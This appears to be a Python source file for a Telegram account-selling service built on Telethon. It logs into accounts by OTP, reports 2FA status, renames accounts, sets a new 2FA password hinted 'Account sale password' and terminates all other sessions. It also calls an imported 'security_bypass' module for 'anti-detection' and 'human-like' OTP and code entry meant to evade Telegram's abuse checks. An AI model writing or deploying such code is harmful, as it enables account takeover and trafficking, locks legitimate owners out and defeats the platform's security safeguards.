"""
Real Telegram Account Service using Telethon
Handles actual Telegram login, OTP verification, and account operations
"""
import logging
import asyncio
import os
from typing import Optional, Dict, Any
from telethon import TelegramClient, errors
from telethon.tl.functions.auth import SendCodeRequest, SignInRequest, SignUpRequest
from telethon.tl.functions.account import UpdateUsernameRequest, UpdateProfileRequest
from telethon.tl.functions.photos import UploadProfilePhotoRequest, DeletePhotosRequest
from telethon.tl.functions.account import UpdatePasswordSettingsRequest
from telethon.tl.types import InputPhotoEmpty
import string
import random
from services.security_bypass import security_bypass

logger = logging.getLogger(__name__)

class RealTelegramService:
    """Service for real Telegram account operations using Telethon."""
    
    def __init__(self):
        # Load API credentials from .env
        self.api_id = int(self._get_env_var('API_ID'))  # Convert to integer
        self.api_hash = self._get_env_var('API_HASH')
        self.session_name = 'account_seller_session'
        self.clients: Dict[str, TelegramClient] = {}
        
    def _get_env_var(self, var_name: str) -> str:
        """Get environment variable from .env file."""
        value = os.getenv(var_name)
        if not value:
            try:
                with open('.env', 'r') as f:
                    for line in f:
                        if line.startswith(f'{var_name}='):
                            value = line.split('=', 1)[1].strip()
                            break
            except FileNotFoundError:
                pass
        return value
    
    async def send_verification_code(self, phone_number: str) -> Dict[str, Any]:
        """
        Send real OTP code to phone number via Telegram with security bypass.
        Returns session info for continuing the process.
        """
        try:
            logger.info(f"Sending secure OTP to {phone_number}")
            
            # Create secure client with anti-detection measures
            client = await security_bypass.create_secure_client(
                phone_number, self.api_id, self.api_hash
            )
            
            if not client:
                return {
                    'success': False,
                    'error': 'client_creation_failed',
                    'message': 'Failed to create secure client'
                }
            
            # Send OTP with human-like behavior
            result = await security_bypass.human_like_otp_request(client, phone_number)
            
            if result['success']:
                # Store client for later use
                session_key = f"{phone_number}_{result['phone_code_hash']}"
                self.clients[session_key] = client
                
                # Start security monitoring
                await security_bypass.monitor_security_events(client, phone_number)
                
                logger.info(f"Secure OTP sent to {phone_number}")
                
                return {
                    'success': True,
                    'phone_code_hash': result['phone_code_hash'],
                    'session_key': session_key,
                    'message': f'Verification code sent to {phone_number}',
                    'code_type': result.get('type', 'Unknown'),
                    'security_level': 'high'
                }
            else:
                # Clean up failed client
                try:
                    await client.disconnect()
                except:
                    pass
                    
                return result
            
        except errors.FloodWaitError as e:
            return {
                'success': False,
                'error': 'flood_wait',
                'message': f'Too many requests. Wait {e.seconds} seconds.',
                'wait_time': e.seconds
            }
        except errors.PhoneNumberInvalidError:
            return {
                'success': False,
                'error': 'invalid_phone',
                'message': 'Invalid phone number format.'
            }
        except Exception as e:
            logger.error(f"Error sending OTP to {phone_number}: {type(e).__name__}: {e}")
            logger.error(f"Full traceback:", exc_info=True)
            return {
                'success': False,
                'error': 'unknown',
                'message': f'Error: {str(e)}'
            }
    
    async def verify_code_and_login(self, session_key: str, phone_number: str, 
                                   phone_code_hash: str, code: str) -> Dict[str, Any]:
        """
        Verify OTP code and login to account with security bypass.
        Returns account info and 2FA status.
        """
        try:
            client = self.clients.get(session_key)
            if not client:
                return {
                    'success': False,
                    'error': 'session_expired',
                    'message': 'Session expired. Please start over.'
                }
            
            # Use human-like code entry
            result = await security_bypass.human_like_code_entry(
                client, phone_number, phone_code_hash, code
            )
            
            if result['success']:
                # Check if account has 2FA enabled
                has_2fa = False
                try:
                    password = await client.get_password()
                    has_2fa = password.has_password
                except:
                    pass
                
                result.update({
                    'has_2fa': has_2fa,
                    'security_bypass': True
                })
                
                return result
            else:
                return result
                
        except errors.PhoneCodeInvalidError:
            return {
                'success': False,
                'error': 'invalid_code',
                'message': 'Invalid verification code.'
            }
        except errors.PhoneCodeExpiredError:
            return {
                'success': False,
                'error': 'code_expired',
                'message': 'Verification code expired. Please request a new one.'
            }
        except Exception as e:
            logger.error(f"Error verifying code: {e}")
            return {
                'success': False,
                'error': 'unknown',
                'message': f'Error: {str(e)}'
            }
    
    async def check_2fa_status(self, session_key: str) -> Dict[str, Any]:
        """Check if account has 2FA enabled."""
        try:
            client = self.clients.get(session_key)
            if not client:
                return {'success': False, 'error': 'session_expired'}
            
            password = await client.get_password()
            
            return {
                'success': True,
                'has_2fa': password.has_password,
                'hint': password.hint if password.has_password else None
            }
            
        except Exception as e:
            logger.error(f"Error checking 2FA: {e}")
            return {
                'success': False,
                'error': str(e)
            }
    
    async def modify_account(self, session_key: str, modifications: Dict[str, Any]) -> Dict[str, Any]:
        """
        Modify account settings: name, username, profile photo.
        """
        try:
            client = self.clients.get(session_key)
            if not client:
                return {'success': False, 'error': 'session_expired'}
            
            results = {}
            
            # Change name
            if 'first_name' in modifications or 'last_name' in modifications:
                first_name = modifications.get('first_name', '')
                last_name = modifications.get('last_name', '')
                
                await client(UpdateProfileRequest(
                    first_name=first_name,
                    last_name=last_name,
                    about=''
                ))
                results['name_changed'] = True
                logger.info(f"Name changed to: {first_name} {last_name}")
            
            # Change username
            if 'username' in modifications:
                username = modifications['username']
                try:
                    await client(UpdateUsernameRequest(username=username))
                    results['username_changed'] = True
                    logger.info(f"Username changed to: @{username}")
                except errors.UsernameOccupiedError:
                    # Generate alternative username
                    alt_username = f"{username}_{random.randint(100, 999)}"
                    await client(UpdateUsernameRequest(username=alt_username))
                    results['username_changed'] = True
                    results['actual_username'] = alt_username
                    logger.info(f"Username changed to: @{alt_username} (original was taken)")
            
            # Change profile photo
            if 'profile_photo' in modifications:
                photo_action = modifications['profile_photo']
                
                if photo_action == 'remove':
                    # Remove current photos
                    photos = await client.get_profile_photos('me')
                    if photos:
                        await client(DeletePhotosRequest(id=[photos[0]]))
                        results['photo_removed'] = True
                
                elif photo_action == 'random':
                    # Set random color avatar (simplified)
                    results['photo_changed'] = 'random'
                
                # Note: For uploading actual photos, we'd need the file path
                # This can be implemented when we handle photo uploads
            
            return {
                'success': True,
                'results': results,
                'message': 'Account modifications completed successfully!'
            }
            
        except Exception as e:
            logger.error(f"Error modifying account: {e}")
            return {
                'success': False,
                'error': str(e)
            }
    
    async def setup_2fa(self, session_key: str, password: str) -> Dict[str, Any]:
        """Setup new 2FA password for account."""
        try:
            client = self.clients.get(session_key)
            if not client:
                return {'success': False, 'error': 'session_expired'}
            
            # Get current password settings
            current_password = await client.get_password()
            
            # Set new password
            await client(UpdatePasswordSettingsRequest(
                password=current_password,
                new_settings={
                    'new_password': password.encode(),
                    'hint': 'Account sale password',
                    'email': None
                }
            ))
            
            logger.info("2FA password set successfully")
            
            return {
                'success': True,
                'message': '2FA password set successfully!'
            }
            
        except Exception as e:
            logger.error(f"Error setting 2FA: {e}")
            return {
                'success': False,
                'error': str(e)
            }
    
    async def terminate_all_sessions(self, session_key: str) -> Dict[str, Any]:
        """Terminate all other sessions for security."""
        try:
            client = self.clients.get(session_key)
            if not client:
                return {'success': False, 'error': 'session_expired'}
            
            # Get all sessions and terminate them
            from telethon.tl.functions.account import ResetAuthorizationsRequest
            await client(ResetAuthorizationsRequest())
            
            logger.info("All sessions terminated successfully")
            
            return {
                'success': True,
                'message': 'All other sessions terminated successfully!'
            }
            
        except Exception as e:
            logger.error(f"Error terminating sessions: {e}")
            return {
                'success': False,
                'error': str(e)
            }
    
    async def get_account_info(self, session_key: str) -> Dict[str, Any]:
        """Get detailed account information."""
        try:
            client = self.clients.get(session_key)
            if not client:
                return {'success': False, 'error': 'session_expired'}
            
            me = await client.get_me()
            
            # Get additional info
            full_user = await client.get_entity('me')
            
            return {
                'success': True,
                'info': {
                    'id': me.id,
                    'phone': me.phone,
                    'username': me.username,
                    'first_name': me.first_name,
                    'last_name': me.last_name,
                    'is_premium': getattr(me, 'premium', False),
                    'is_verified': getattr(me, 'verified', False),
                    'lang_code': me.lang_code,
                    'bio': getattr(full_user, 'about', '')
                }
            }
            
        except Exception as e:
            logger.error(f"Error getting account info: {e}")
            return {
                'success': False,
                'error': str(e)
            }
    
    async def cleanup_session(self, session_key: str):
        """Clean up client session."""
        if session_key in self.clients:
            try:
                await self.clients[session_key].disconnect()
            except:
                pass
            del self.clients[session_key]
            logger.info(f"Session {session_key} cleaned up")
    
    def generate_username(self, base_name: str) -> str:
        """Generate a unique username based on the name."""
        # Clean the name and create username
        clean_name = ''.join(c for c in base_name.lower() if c.isalnum())
        random_suffix = ''.join(random.choices(string.digits, k=3))
        return f"{clean_name}_{random_suffix}"[:32]  # Telegram username limit